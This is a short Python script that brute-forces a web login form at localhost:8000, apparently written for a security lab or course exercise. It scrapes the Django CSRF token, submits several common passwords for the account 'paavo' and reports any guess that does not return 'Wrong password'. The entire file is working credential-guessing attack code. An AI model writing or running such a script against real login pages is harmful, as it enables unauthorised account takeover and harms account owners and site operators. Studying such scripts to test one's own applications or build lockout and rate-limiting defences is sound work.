import requests
from bs4 import BeautifulSoup

URL = "http://localhost:8000/login/"
username = "paavo"
passwords = ["123", "admin", "admin2", "admin3", "password", "paavo"]

for password in passwords:
    session = requests.Session()
    r = session.get(URL)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrfmiddlewaretoken"}).get("value")

    data = {
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": csrf,
    }

    response = session.post(URL, data=data, headers={"Referer": URL})

    if response.status_code == 200 and "Wrong password" not in response.text:
        print(f"Success: {username}:{password}")
